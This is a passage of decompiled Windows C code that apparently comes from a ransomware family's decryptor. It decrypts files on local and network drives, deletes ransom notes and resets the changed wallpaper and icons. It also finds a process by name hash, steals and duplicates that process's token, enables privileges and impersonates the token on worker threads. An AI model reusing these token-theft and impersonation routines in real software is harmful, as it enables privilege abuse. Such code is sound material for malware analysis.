    return result;
}

uint64_t __stdcall sub_401E7C(uint64_t* a1, uint64_t* a2) {
    uint64_t v2 = sub_401004(*a2, 0x5851F42D4C957F2DULL) + 0x14057B7EF767814FULL;
    *a2 = v2;
    return sub_401004(*a1, v2);
}

uint64_t __stdcall sub_401EC0(const uint32_t* a1, uint8_t* a2) {
    uint64_t result = 0;
    uint32_t* out32 = (uint32_t*)a2;
    uint64_t* out64 = (uint64_t*)(a2 + 64);

    for (int i = 0; i < 8; ++i) {
        uint32_t w0 = a1[2 * i];
        uint32_t w1 = a1[2 * i + 1];
        out32[2 * i]     = w0;
        out32[2 * i + 1] = w1;
        result = (134775813u * w1 + 1u) * (uint64_t)w0;
        out64[i] = result;
    }
    return result;
}

PVOID __stdcall sub_401FA8(SIZE_T Size) {
    return RtlAllocateHeap(get_peb_x86()->ProcessHeap, HEAP_ZERO_MEMORY, Size);
}

PVOID __stdcall sub_401FC4(PVOID Ptr, SIZE_T Size) {
    return RtlReAllocateHeap(get_peb_x86()->ProcessHeap, HEAP_ZERO_MEMORY, Ptr, Size);
}

BOOLEAN __stdcall sub_401FE4(PVOID P) {
    return RtlFreeHeap(get_peb_x86()->ProcessHeap, 0, P);
}

PVOID __stdcall sub_402000(PVOID HeapHandle, SIZE_T Size) {
    return RtlAllocateHeap(HeapHandle, HEAP_ZERO_MEMORY, Size);
}

uint32_t* __stdcall sub_402014(int a1) {
    uint8_t* raw = (uint8_t*)sub_401FA8((SIZE_T)(a1 + 19));
    if (raw != NULL) {
        uint32_t* aligned = (uint32_t*)(((uintptr_t)raw + 19u) & ~0xFu);
        *(aligned - 1) = (uint32_t)(uintptr_t)raw;
        return aligned;
    }
    return NULL;
}

BOOLEAN __stdcall sub_402050(void* a1) {
    uint32_t* p = (uint32_t*)a1;
    return sub_401FE4((PVOID)(uintptr_t)*(p - 1));
}

wchar_t* __stdcall sub_40206C(const wchar_t* String, int a2) {
    size_t len = wcslen(String);
    if (len == 0)
        return NULL;
    wchar_t* dst = (wchar_t*)sub_401FA8(2u * ((size_t)a2 + len) + 2u);
    if (dst != NULL)
        wcscpy(dst, String);
    return dst;
}

uint32_t* __stdcall sub_4020C4(const wchar_t* String) {
    size_t len = wcslen(String);
    if (len == 0)
        return NULL;
    uint32_t* p = (uint32_t*)sub_401FA8(2u * len + 10u);
    if (p != NULL) {
        p[0] = 6029404u;
        p[1] = 6029375u;
        wcscat((wchar_t*)p, String);
    }
    return p;
}

uint32_t* __stdcall sub_402124(const wchar_t* String) {
    const wchar_t* src = String;
    size_t len = wcslen(String);
    if (len == 0)
        return NULL;
    uint32_t* p = (uint32_t*)sub_401FA8(2u * len + 22u);
    if (p != NULL) {
        p[0] = 6029404u;
        p[1] = 6029375u;
        p[2] = 5111893u;
        p[3] = 6029379u;
        if (*(const uint32_t*)String == 6029404u)
            src = String + 2;
        wcscat((wchar_t*)p, src);
    }
    return p;
}

BOOL __stdcall sub_402230(HANDLE hFileArg, int a3, const wchar_t* Format, const wchar_t* a5) {
    DWORD written = 0;
    if (hFileArg == INVALID_HANDLE_VALUE || hFileArg == NULL || Format == NULL)
        return FALSE;

    if (a5 != NULL) {
        _snwprintf(Buffer, _countof(Buffer) - 1, aTrueSS, Format, a5);
    } else {
        const wchar_t* reason = aFileEmpty;
        switch (a3) {
            case 1: reason = aFileNotFound; break;
            case 2: reason = aFileNotEncrypt; break;
            case 3: reason = aFileRsaKeyNotV; break;
            default: break;
        }
        _snwprintf(Buffer, _countof(Buffer) - 1, aFalseSS, Format, reason);
    }

    int narrowLen = sub_401084((const int16_t*)Buffer, (uint8_t*)Buffer);
    return WriteFile(hFileArg, Buffer, (DWORD)narrowLen, &written, NULL);
}

BOOL sub_4022E0(void) {
    BOOL isSystem = FALSE;
    HANDLE hToken = NULL;
    BYTE tokenInfo[44];
    ULONG retLen = 0;

    if (NtOpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken) == 0) {
        if (NtQueryInformationToken(hToken, TokenUser, tokenInfo, sizeof(tokenInfo), &retLen) == 0) {
            PSID userSid = ((PTOKEN_USER)tokenInfo)->User.Sid;
            isSystem = (*(DWORD*)((uint8_t*)userSid + 8) == 18u);
        }
        NtClose(hToken);
    }
    return isSystem;
}

void* sub_40233C(void) {
    HANDLE hProc = NULL;
    HANDLE hToken = NULL;
    HANDLE hDup = NULL;

    DWORD pid = sub_402450();
    if (pid != 0) {
        CLIENT_ID cid;
        cid.UniqueProcess = (HANDLE)(uintptr_t)pid;
        cid.UniqueThread = NULL;

        OBJECT_ATTRIBUTES oa;
        oa.Length = sizeof(oa);
        oa.RootDirectory = NULL;
        oa.ObjectName = NULL;
        oa.Attributes = 0;
        oa.SecurityDescriptor = NULL;
        oa.SecurityQualityOfService = NULL;

        if (NtOpenProcess(&hProc, PROCESS_ALL_ACCESS, &oa, &cid) == 0 &&
            NtOpenProcessToken(hProc, TOKEN_ALL_ACCESS, &hToken) == 0) {
            SECURITY_QUALITY_OF_SERVICE sqos;
            sqos.Length = sizeof(sqos);
            sqos.ImpersonationLevel = SecurityImpersonation;
            sqos.ContextTrackingMode = SECURITY_STATIC_TRACKING;
            sqos.EffectiveOnly = FALSE;

            OBJECT_ATTRIBUTES dupOa;
            dupOa.Length = sizeof(dupOa);
            dupOa.RootDirectory = NULL;
            dupOa.ObjectName = NULL;
            dupOa.Attributes = 0;
            dupOa.SecurityDescriptor = NULL;
            dupOa.SecurityQualityOfService = &sqos;

            NtDuplicateToken(hToken, MAXIMUM_ALLOWED, &dupOa, FALSE, TokenPrimary, &hDup);
        }
    }

    if (hToken != NULL)
        NtClose(hToken);
    if (hProc != NULL)
        NtClose(hProc);
    return hDup;
}

DWORD sub_402450(void) {
    DWORD pid = 0;
    ULONG bufSize = 1024;
    uint8_t* buf = (uint8_t*)sub_401FA8(bufSize);
    if (buf == NULL)
        return 0;

    NTSTATUS status;
    while ((status = NtQuerySystemInformation(SystemProcessInformation, buf, bufSize, &bufSize)) != 0) {
        if (status != (NTSTATUS)0xC0000004L)
            goto cleanup;
        buf = (uint8_t*)sub_401FC4(buf, bufSize);
        if (buf == NULL)
            return 0;
    }

    uint8_t* cur = buf;
    for (;;) {
        DWORD nextOffset = *(DWORD*)cur;
        const uint16_t* procName = *(const uint16_t**)(cur + 60);
        if (procName != NULL && sub_40103C(procName, 0) == 1051882214) {
            pid = *(DWORD*)(cur + 68);
            break;
        }
        if (nextOffset == 0)
            break;
        cur += nextOffset;
    }

cleanup:
    sub_401FE4(buf);
    return pid;
}

ULONG sub_4024FC(void) {
    ULONG* p = g_PrivilegeList;
    BOOLEAN oldVal = FALSE;
    ULONG priv;
    while ((priv = *p++) != 0) {
        RtlAdjustPrivilege(priv, TRUE, FALSE, &oldVal);
    }
    return 0;
}

uint8_t* __stdcall sub_402528(const uint32_t* a1) {
    uint32_t size = *(a1 - 1);
    uint8_t* buf = (uint8_t*)sub_401FA8(size);
    if (buf != NULL) {
        memcpy(buf, a1, size);
        sub_401DF0(buf, (int)size);
    }
    return buf;
}

int __stdcall sub_4025F0(wchar_t* outBuf) {
    uint32_t md5Ctx[26];
    MD5Init(md5Ctx);
    MD5Update(md5Ctx, (const uint8_t*)dword_407704 + 128, 128);
    MD5Final(md5Ctx);

    return _snwprintf(
        outBuf, 63, a08x04x04x02x02,
        md5Ctx[22],
        md5Ctx[23] & 0xFFFFu,
        (md5Ctx[23] >> 16) & 0xFFFFu,
        md5Ctx[24] & 0xFFu,
        (md5Ctx[24] >> 8) & 0xFFu,
        (md5Ctx[24] >> 16) & 0xFFu,
        (md5Ctx[24] >> 24) & 0xFFu,
        md5Ctx[25] & 0xFFu,
        (md5Ctx[25] >> 8) & 0xFFu,
        (md5Ctx[25] >> 16) & 0xFFu,
        (md5Ctx[25] >> 24) & 0xFFu);
}

void* sub_402678(void) {
    wchar_t* out = (wchar_t*)sub_401FA8(0x18u);
    if (out == NULL)
        return NULL;

    out[0] = L'.';
    wchar_t* dst = out + 1;

    uint8_t md5Ctx[88];
    uint8_t digest[16];
    wchar_t guidBuf[64];
    int b64Buf[8];

    MD5Init(md5Ctx);
    int n = sub_4025F0(guidBuf);
    if (n != 0) {
        MD5Update(md5Ctx, guidBuf, (unsigned int)(2 * n));
        MD5Final(md5Ctx);
        sub_4011CC(0, digest, 16, b64Buf);
        ((uint8_t*)b64Buf)[9] = 0;

        const char* p = (const char*)b64Buf;
        wchar_t ch = 0;
        while (*p != 0) {
            ch = (wchar_t)(uint8_t)*p++;
            switch (ch) {
                case L'+': ch = L'x'; break;
                case L'/': ch = L'i'; break;
                case L'=': ch = L'z'; break;
                default: break;
            }
            *dst++ = ch;
        }
        *dst = 0;
    }
    return out;
}

int sub_40271C(void) {
    int hash = 0;
    wchar_t* extObj = (wchar_t*)sub_402678();
    if (extObj != NULL) {
        wchar_t noteName[32];
        _snwprintf(noteName, _countof(noteName) - 1, aSReadmeTxt, extObj + 1);
        hash = sub_40103C((const uint16_t*)noteName, -1);
        sub_401FE4(extObj);
    }
    return hash;
}

char sub_402770(void) {
    char* decoded = (char*)sub_402528(dword_40900C);
    if (decoded != NULL) {
        dword_407704 = sub_401FA8(0x100u);
        if (dword_407704 != NULL) {
            memcpy(dword_407704, decoded, 0x100u);
            dword_407700 = sub_40271C();
            uint32_t outSz = sub_40142C(decoded + 256);
            dword_407708 = (int)(uintptr_t)sub_401FA8(outSz + 2u);
            if (dword_407708 != 0)
                sub_4010AC(decoded + 256, (uint8_t*)(uintptr_t)dword_407708);
        }
        sub_401FE4(decoded);
    }
    return 0;
}

BOOL __stdcall sub_402800(LPCWSTR pszPathArg, DWORD lowSize, DWORD highSize) {
    (void)lowSize;
    (void)highSize;
    LPWSTR fileName = PathFindFileNameW(pszPathArg);
    if (sub_40103C((const uint16_t*)fileName, -1) == dword_407700) {
        SetFileAttributesW(pszPathArg, FILE_ATTRIBUTE_NORMAL);
        return DeleteFileW(pszPathArg);
    }
    return FALSE;
}

int __stdcall sub_402848(HANDLE a1, wchar_t* Destination) {
    HANDLE hToken = NULL;
    LPWSTR sidStr = NULL;
    BYTE tokenInfo[40];
    ULONG retLen = 0;
    int ok = 0;

    HANDLE target = a1;
    if (target == NULL) {
        if (NtOpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken) != 0)
            goto cleanup;
        target = hToken;
    }

    if (NtQueryInformationToken(target, TokenUser, tokenInfo, sizeof(tokenInfo), &retLen) == 0 &&
        ConvertSidToStringSidW(((PTOKEN_USER)tokenInfo)->User.Sid, &sidStr)) {
        wcscpy(Destination, sidStr);
        ok = 1;
    }

cleanup:
    if (sidStr != NULL)
        LocalFree(sidStr);
    if (hToken != NULL)
        NtClose(hToken);
    return ok;
}

void sub_4028F0(void) {
    wchar_t* extObj = (wchar_t*)sub_402678();
    if (extObj == NULL)
        return;

    WCHAR path[MAX_PATH];
    SHGetSpecialFolderPathW(NULL, path, CSIDL_COMMON_APPDATA, FALSE);
    sub_401564(path);
    wcscat(path, extObj + 1);
    wcscat(path, L".bmp");
    DeleteFileW(path);

    LPWSTR ext = PathFindExtensionW(path);
    wcscpy(ext, L".ico");
    DeleteFileW(path);

    wcscpy(path, extObj + 1);
    wcscat(path, L"\\DefaultIcon");

    HMODULE hAdvapi = GetModuleHandleW(ModuleName);
    pfnRegDeleteKeyExW = (PFN_RegDeleteKeyExW)GetProcAddress(hAdvapi, ProcName);
    if (pfnRegDeleteKeyExW != NULL) {
        pfnRegDeleteKeyExW(HKEY_CLASSES_ROOT, path, KEY_WOW64_64KEY, 0);
        pfnRegDeleteKeyExW(HKEY_CLASSES_ROOT, extObj + 1, KEY_WOW64_64KEY, 0);
        pfnRegDeleteKeyExW(HKEY_CLASSES_ROOT, extObj, KEY_WOW64_64KEY, 0);
    } else {
        RegDeleteKeyW(HKEY_CLASSES_ROOT, path);
        RegDeleteKeyW(HKEY_CLASSES_ROOT, extObj + 1);
        RegDeleteKeyW(HKEY_CLASSES_ROOT, extObj);
    }

    sub_402848(ExistingTokenHandle, path);
    sub_401564(path);
    wcscat(path, L"Control Panel\\Desktop");

    HKEY hKey = NULL;
    if (RegCreateKeyExW(HKEY_USERS, path, 0, NULL, 0, KEY_WRITE | KEY_WOW64_64KEY, NULL, &hKey, NULL) == 0)
        RegSetValueExW(hKey, ValueName, 0, REG_SZ, NULL, 0);
    if (hKey != NULL)
        NtClose(hKey);

    INT elem = COLOR_BACKGROUND;
    COLORREF rgb = 10841658;
    SetSysColors(1, &elem, &rgb);

    UINT winIni = (sub_401478() != 52) ? (SPIF_UPDATEINIFILE | SPIF_SENDCHANGE) : SPIF_UPDATEINIFILE;
    SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, NULL, winIni);
    SHChangeNotify(SHCNE_ASSOCCHANGED, SHCNF_IDLIST, NULL, NULL);

    sub_401FE4(extObj);
}

char sub_402B3C(void) {
    uint32_t* p = sub_402014(4);
    if (p != NULL) {
        *p = 3u;
        NtSetInformationProcess(GetCurrentProcess(), ProcessIoPriority, p, 4u);
        *p <<= 9;
        NtSetInformationProcess(GetCurrentProcess(), ProcessPriorityClass, p, 2u);
        *p = 7u;
        NtSetInformationProcess(GetCurrentProcess(), ProcessDefaultHardErrorMode, p, 4u);
        sub_402050(p);
    }
    return 0;
}

BOOL __stdcall sub_402B8C(HANDLE hTokenSrc, HANDLE hThread) {
    BOOL ok = FALSE;
    HANDLE hDup = NULL;
    OBJECT_ATTRIBUTES oa;
    oa.Length = sizeof(oa);
    oa.RootDirectory = NULL;
    oa.ObjectName = NULL;
    oa.Attributes = 0;
    oa.SecurityDescriptor = NULL;
    oa.SecurityQualityOfService = NULL;

    if (NtDuplicateToken(hTokenSrc, TOKEN_IMPERSONATE | TOKEN_QUERY, &oa, FALSE, TokenImpersonation, &hDup) == 0) {
        ok = (NtSetInformationThread(hThread, ThreadImpersonationToken, &hDup, sizeof(hDup)) == 0);
        NtClose(hDup);
    }
    return ok;
}

typedef struct _WNET_UNIV_PARAMS {
    LPCWSTR lpLocalPath;
    DWORD dwInfoLevel;
    LPVOID lpBuffer;
    LPDWORD lpBufferSize;
} WNET_UNIV_PARAMS;

ULONG __stdcall StartAddress(PVOID Parameter) {
    WNET_UNIV_PARAMS* p = (WNET_UNIV_PARAMS*)Parameter;
    return WNetGetUniversalNameW(p->lpLocalPath, p->dwInfoLevel, p->lpBuffer, p->lpBufferSize);
}

DWORD __stdcall sub_402C28(HANDLE hTokenSrc, LPCWSTR a2, DWORD a3, LPVOID a4, LPDWORD a5) {
    WNET_UNIV_PARAMS params = { a2, a3, a4, a5 };
    DWORD exitCode = 0;
    HANDLE hThread = CreateThread(NULL, 0, StartAddress, &params, CREATE_SUSPENDED, NULL);
    if (hThread != NULL) {
        if (hTokenSrc != NULL && !sub_402B8C(hTokenSrc, hThread)) {
            NtTerminateThread(hThread, 0);
            NtClose(hThread);
            return exitCode;
        }
        ResumeThread(hThread);
        WaitForSingleObject(hThread, INFINITE);
        GetExitCodeThread(hThread, &exitCode);
        NtClose(hThread);
    }
    return exitCode;
}

typedef struct _DRIVE_STR_PARAMS {
    DWORD nBufferLength;
    LPWSTR lpBuffer;
} DRIVE_STR_PARAMS;

ULONG __stdcall sub_402CD4(PVOID Parameter) {
    DRIVE_STR_PARAMS* p = (DRIVE_STR_PARAMS*)Parameter;
    return GetLogicalDriveStringsW(p->nBufferLength, p->lpBuffer);
}

DWORD __stdcall sub_402CE8(HANDLE hTokenSrc, DWORD a2, LPWSTR a3) {
    DRIVE_STR_PARAMS params = { a2, a3 };
    DWORD exitCode = 0;
    HANDLE hThread = CreateThread(NULL, 0, sub_402CD4, &params, CREATE_SUSPENDED, NULL);
    if (hThread != NULL) {
        if (hTokenSrc != NULL && !sub_402B8C(hTokenSrc, hThread)) {
            NtTerminateThread(hThread, 0);
            NtClose(hThread);
            return exitCode;
        }
        ResumeThread(hThread);
        WaitForSingleObject(hThread, INFINITE);
        GetExitCodeThread(hThread, &exitCode);
        NtClose(hThread);
    }
    return exitCode;
}

ULONG __stdcall sub_402D98(const WCHAR* Parameter) {
    return GetDriveTypeW(Parameter);
}

DWORD __stdcall sub_402DA8(HANDLE hTokenSrc, LPVOID lpParameter) {
    DWORD exitCode = 0;
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)sub_402D98, lpParameter, CREATE_SUSPENDED, NULL);
    if (hThread != NULL) {
        if (hTokenSrc != NULL && !sub_402B8C(hTokenSrc, hThread)) {
            NtTerminateThread(hThread, 0);
            NtClose(hThread);
            return exitCode;
        }
        ResumeThread(hThread);
        WaitForSingleObject(hThread, INFINITE);
        GetExitCodeThread(hThread, &exitCode);
        NtClose(hThread);
    }
    return exitCode;
}

BOOL __stdcall sub_402E48(LPCWSTR lpFileName, PLARGE_INTEGER lpFileSize) {
    BOOL ok = FALSE;
    HANDLE hF = CreateFileW(lpFileName, GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (hF != INVALID_HANDLE_VALUE) {
        ok = GetFileSizeEx(hF, lpFileSize);
        NtClose(hF);
    }
    return ok;
}

char sub_402E94(void) {
    ULONG maxWorkers = sub_401418();
    if (dword_407F4C != 0 && maxWorkers >= 4)
        maxWorkers >>= 1;

    DWORD needed = sub_402CE8(ExistingTokenHandle, 0, NULL);
    if (needed == 0)
        return 0;

    WCHAR* drives = (WCHAR*)sub_401FA8(2u * needed);
    if (drives == NULL)
        return 0;

    DWORD len = sub_402CE8(ExistingTokenHandle, needed, drives);
    if (len == 0) {
        sub_401FE4(drives);
        return 0;
    }

    DWORD count = len >> 2;
    HANDLE* handles = (HANDLE*)sub_401FA8(4u * count);
    HANDLE* compact = (HANDLE*)sub_401FA8(4u * count);
    if (handles == NULL || compact == NULL) {
        if (compact) sub_401FE4(compact);
        if (handles) sub_401FE4(handles);
        sub_401FE4(drives);
        return 0;
    }

    dword_407F18 = 0;
    Addend = 0;
    DWORD active = 0;
    WCHAR* cur = drives;

    for (DWORD i = 0; i < count; ++i, cur += 4) {
        DWORD dtype = sub_402DA8(ExistingTokenHandle, cur);
        if (dtype == DRIVE_REMOVABLE || dtype == DRIVE_FIXED) {
            uint32_t* param = sub_4020C4(cur);
            HANDLE hT = CreateThread(NULL, 0, sub_403CEC, param, 0, NULL);
            if (hT != NULL) {
                handles[active++] = hT;
                if (active == maxWorkers) {
                    DWORD idx = WaitForMultipleObjects(active, handles, FALSE, INFINITE);
                    NtClose(handles[idx]);
                    handles[idx] = NULL;
                    --active;
                }
            }
        } else if (dtype == DRIVE_REMOTE) {
            uint32_t* param = sub_4020C4(cur);
            HANDLE hT = CreateThread(NULL, 0, sub_403CEC, param, CREATE_SUSPENDED, NULL);
            if (hT != NULL) {
                if (sub_402B8C(ExistingTokenHandle, hT)) {
                    ResumeThread(hT);
                    handles[active++] = hT;
                    if (active == maxWorkers) {
                        DWORD idx = WaitForMultipleObjects(active, handles, FALSE, INFINITE);
                        NtClose(handles[idx]);
                        handles[idx] = NULL;
                        --active;
                    }
                } else {
                    NtTerminateThread(hT, 0);
                    NtClose(hT);
                }
            }
        }
    }

    if (active != 0) {
        DWORD cIdx = 0;
        for (DWORD i = 0; i < count; ++i) {
            if (handles[i] != NULL)
                compact[cIdx++] = handles[i];
        }
        WaitForMultipleObjects(active, compact, TRUE, INFINITE);
        for (DWORD i = 0; i < active; ++i)
            NtClose(compact[i]);
    }

    for (;;) {
        LONG snap = dword_407F18;
        if (snap == InterlockedCompareExchange(&Addend, snap, snap))
            break;
        Sleep(100);
    }

    sub_401FE4(compact);
    sub_401FE4(handles);
    sub_401FE4(drives);
    return 1;
}

typedef struct _DEC_WORK_CTX {
    OVERLAPPED ov;
    uint64_t offset;
    uint64_t chunk_step;
    uint64_t orig_size;
    uint32_t stage;
    HANDLE hFile;
    DWORD rem_chunks;
    DWORD reset_chunks;
    uint8_t pad_3c[440];
    HANDLE hHeap;
    DWORD block_size;
    uint8_t pad_1fc[16];
    uint8_t io_buf[1];
} DEC_WORK_CTX;

DWORD __stdcall sub_4030DC(LPVOID lpParam) {
    (void)lpParam;
    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_HIGHEST);

    for (;;) {
        DWORD bytes = 0;
        ULONG_PTR key = 0;
        LPOVERLAPPED pOv = NULL;
        BOOL ok = GetQueuedCompletionStatus(CompletionPort, &bytes, &key, &pOv, INFINITE);
        DEC_WORK_CTX* ctx = (DEC_WORK_CTX*)pOv;

        if (!ok) {
            if (read_teb_last_error() != ERROR_HANDLE_EOF)
                return FALSE;
            ctx->stage = 2;
            while (!PostQueuedCompletionStatus(CompletionPort, 0, 0, pOv))
                ;
            continue;
        }

        while (pOv != NULL) {
            IsBadReadPtr(pOv, 0x249u);
            if (ctx->stage == 0) {
                ctx->ov.Offset = (DWORD)(ctx->offset & 0xFFFFFFFFu);
                ctx->ov.OffsetHigh = (DWORD)(ctx->offset >> 32);
                ctx->stage = 1;
                if (!ReadFile(ctx->hFile, ctx->io_buf, ctx->block_size, &bytes, pOv) &&
                    read_teb_last_error() != ERROR_IO_PENDING) {
                    if (read_teb_last_error() == ERROR_HANDLE_EOF) {
                        ctx->stage = 2;
                        PostQueuedCompletionStatus(CompletionPort, 0, 0, pOv);
                    } else {
                        do {
                            Sleep(100);
                        } while (!ReadFile(ctx->hFile, ctx->io_buf, ctx->block_size, &bytes, pOv) &&
                                 read_teb_last_error() != ERROR_IO_PENDING);
                    }
                }
            } else if (ctx->stage == 1) {
                sub_4019BC(bytes, (__m128i*)ctx->io_buf, (uint32_t)(uintptr_t)ctx->pad_3c);
                if (ctx->rem_chunks != 0) {
                    ctx->offset += 0x20000ULL;
                    --ctx->rem_chunks;
                    ctx->stage = 0;
                } else if (ctx->chunk_step != 0) {
                    ctx->offset += ctx->chunk_step;
                    ctx->rem_chunks = ctx->reset_chunks;
                    ctx->stage = 0;
                } else {
                    ctx->stage = 2;
                }

                DWORD written = 0;
                while (!WriteFile(ctx->hFile, ctx->io_buf, bytes, &written, pOv) &&
                       read_teb_last_error() != ERROR_IO_PENDING) {
                    Sleep(100);
                }
            } else if (ctx->stage == 2) {
                LARGE_INTEGER endPos;
                endPos.QuadPart = (LONGLONG)(ctx->orig_size - *(uint64_t*)(ctx->pad_3c + 4));
                SetFilePointerEx(ctx->hFile, endPos, NULL, FILE_BEGIN);
                SetEndOfFile(ctx->hFile);
                NtClose(ctx->hFile);
                RtlDestroyHeap(ctx->hHeap);
                InterlockedIncrement(&Addend);
                InterlockedIncrement(&dword_407F60);
                break;
            }

            ok = GetQueuedCompletionStatus(CompletionPort, &bytes, &key, &pOv, INFINITE);
            ctx = (DEC_WORK_CTX*)pOv;
            if (!ok && read_teb_last_error() == ERROR_HANDLE_EOF) {
                ctx->stage = 2;
                while (!PostQueuedCompletionStatus(CompletionPort, 0, 0, pOv))
                    ;
            }
        }
    }
    return TRUE;
}

int sub_4033B0(void) {
    ULONG nCpu = get_peb_x86()->NumberOfProcessors;
    if ((nCpu & 0x20u) != 0)
        nCpu = 32;
    DWORD workers = 2 * nCpu + 1;
    int started = 0;

    CompletionPort = CreateIoCompletionPort(INVALID_HANDLE_VALUE, NULL, 0, workers);
    if (CompletionPort != NULL) {
        for (DWORD i = workers; i != 0; --i) {
            HANDLE hT = CreateThread(NULL, 0, sub_4030DC, NULL, 0, NULL);
            if (hT != NULL) {
                NtClose(hT);
                ++started;
            }
        }
    }
    RtlInitializeCriticalSection(&CriticalSection);
    return started;
}

NTSTATUS __stdcall sub_403430(int a1) {
    for (int i = a1; i != 0; --i) {
        PostQueuedCompletionStatus(CompletionPort, 0, 0, NULL);
    }
    if (a1 != 0 && CompletionPort != NULL)
        NtClose(CompletionPort);
    return RtlDeleteCriticalSection(&CriticalSection);
}

uint32_t* __stdcall sub_403474(const uint8_t* a1, uint32_t a2) {
    if (a2 == 0 || a1 == NULL)
        return NULL;
    uint32_t* out = (uint32_t*)sub_401FA8(4u);
    if (out != NULL) {
        uint32_t h1 = (uint32_t)sub_401324(a1, a2, 0xD6917Au);
        uint32_t h2 = (uint32_t)sub_401324(a1, a2, _byteswap_ulong(h1));
        *out = _byteswap_ulong((uint32_t)sub_401324(a1, a2, _byteswap_ulong(h2)));
    }
    return out;
}

int __stdcall sub_4034CC(LPCWSTR lpFileName) {
    int match = 0;
    SetFileAttributesW(lpFileName, FILE_ATTRIBUTE_NORMAL);
    HANDLE hF = CreateFileW(lpFileName, GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (hF != INVALID_HANDLE_VALUE) {
        LARGE_INTEGER off;
        off.QuadPart = -132LL;
        DWORD bytesRead = 0;
        uint32_t footerCrc = 0;
        uint8_t blob[128];

        if (SetFilePointerEx(hF, off, NULL, FILE_END) &&
            ReadFile(hF, &footerCrc, sizeof(footerCrc), &bytesRead, NULL) &&
            ReadFile(hF, blob, sizeof(blob), &bytesRead, NULL)) {
            uint32_t* calc = sub_403474(blob, sizeof(blob));
            if (calc != NULL) {
                if (*calc == footerCrc)
                    match = (int)*calc;
                sub_401FE4(calc);
            }
        }
        NtClose(hF);
    }
    return match;
}

DWORD __stdcall sub_403584(LPCWSTR lpFileName, void** a3) {
    DWORD readBack = 0;
    HANDLE hF = CreateFileW(lpFileName, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hF != INVALID_HANDLE_VALUE) {
        LARGE_INTEGER off;
        off.QuadPart = -134LL;
        uint16_t hdrLen = 0;
        DWORD bytesRead = 0;

        if (SetFilePointerEx(hF, off, NULL, FILE_END) &&
            ReadFile(hF, &hdrLen, sizeof(hdrLen), &bytesRead, NULL)) {
            uint8_t* buf = (uint8_t*)sub_401FA8(0x2E0u);
            if (buf != NULL) {
                DWORD toRead = 736u - (602u - (DWORD)hdrLen);
                uint8_t* dst = buf - (int)hdrLen + 602;
                LARGE_INTEGER seekBack;
                seekBack.QuadPart = -(LONGLONG)toRead;

                if (SetFilePointerEx(hF, seekBack, NULL, FILE_END) &&
                    ReadFile(hF, dst, toRead, &bytesRead, NULL)) {
                    if (bytesRead == 0) {
                        sub_401FE4(buf);
                        readBack = 0;
                    } else {
                        readBack = toRead;
                    }
                    *a3 = buf;
                }
            }
        }
        CloseHandle(hF);
    }
    return readBack;
}

LPCWSTR __stdcall sub_40369C(wchar_t* P) {
    wchar_t suffix[16];
    wchar_t fmt[8] = L"%d";
    LPCWSTR candidate = NULL;
    int idx = 0;

    do {
        if (candidate != NULL) {
            sub_401FE4((PVOID)candidate);
            candidate = NULL;
        }
        int sLen = _snwprintf(suffix, _countof(suffix) - 1, fmt, idx++);
        candidate = sub_40206C(P, 2 * sLen + 22);
        if (candidate == NULL)
            break;

        LPWSTR ext = PathFindExtensionW((LPWSTR)candidate);
        if (*ext != 0) {
            size_t extChars = wcslen(ext);
            memmove(ext + sLen, ext, 2u * (extChars + 1u));
            memcpy(ext, suffix, 2u * (size_t)sLen);
        } else {
            wcscat((LPWSTR)candidate, suffix);
        }
    } while (GetFileAttributesW(candidate) != INVALID_FILE_ATTRIBUTES);

    if (P != NULL)
        sub_401FE4(P);
    return candidate;
}

wchar_t* __stdcall sub_40378C(const wchar_t* a1, uint16_t* a2) {
    wchar_t* resultPath = NULL;
    wchar_t* decompressed = NULL;
    PVOID keyBuf = sub_401FA8(0x80u);

    if (keyBuf != NULL) {
        memcpy(keyBuf, a2 + 304, 0x80u);
        uint32_t encLen = a2[301];
        uint8_t* encName = (uint8_t*)a2 - encLen + 602;
        sub_4019BC(encLen, (__m128i*)encName, (uint32_t)(uintptr_t)keyBuf);

        uint16_t origNameBytes = a2[260];
        a2[260] = 0;
        decompressed = (wchar_t*)sub_401FA8(4u * origNameBytes);
        if (decompressed != NULL) {
            sub_404EBC(encName, (uint8_t*)decompressed);
            if (decompressed != (wchar_t*)(intptr_t)-1) {
                size_t nameLen = wcslen(decompressed);
                resultPath = sub_40206C(a1, (int)nameLen);
                if (resultPath != NULL) {
                    LPWSTR fname = PathFindFileNameW(resultPath);
                    wcscpy(fname, decompressed);
                }
            }
        }
    }

    if (decompressed != NULL)
        sub_401FE4(decompressed);
    if (keyBuf != NULL)
        sub_401FE4(keyBuf);
    return resultPath;
}

char* __stdcall sub_403890(int a1, const uint8_t* a2, uint64_t a3) {
    (void)a1;
    DWORD blockSz = (a3 >= 0x20000ULL) ? 0x20000u : (DWORD)a3;
    char* ctx = NULL;

    RtlEnterCriticalSection(&CriticalSection);
    HANDLE hHeap = RtlCreateHeap(HEAP_GROWABLE | HEAP_ZERO_MEMORY, NULL, 0, 0x100000u, NULL, NULL);
    if (hHeap != NULL) {
        ctx = (char*)sub_402000(hHeap, (SIZE_T)blockSz + 584u);
        if (ctx != NULL) {
            *(HANDLE*)(ctx + 0x1F4) = hHeap;
            *(DWORD*)(ctx + 0x1F8) = blockSz;
            sub_401EC0((const uint32_t*)(a2 + 538), (uint8_t*)(ctx + 64));
            *(uint32_t*)(ctx + 28) = *(const uint32_t*)(a2 + 522);
            *(uint32_t*)(ctx + 32) = *(const uint32_t*)(a2 + 526);
            *(uint32_t*)(ctx + 56) = *(const uint32_t*)(a2 + 530);
            *(uint32_t*)(ctx + 52) = *(const uint32_t*)(a2 + 534);
            *(uint64_t*)(ctx + 36) = a3;
        }
    }
    RtlLeaveCriticalSection(&CriticalSection);
    return ctx;
}

int __stdcall sub_403960(WCHAR* lpExistingFileName, uint64_t a3, PVOID* a4) {
    int status = 0;
    DWORD metaLen = 0;
    wchar_t* lpNewFileName = NULL;

    int magic = sub_4034CC(lpExistingFileName);
    if (magic == 0) {
        sub_402230(hFile, 2, lpExistingFileName, NULL);
        goto cleanup;
    }

    if (*a4 != NULL) {
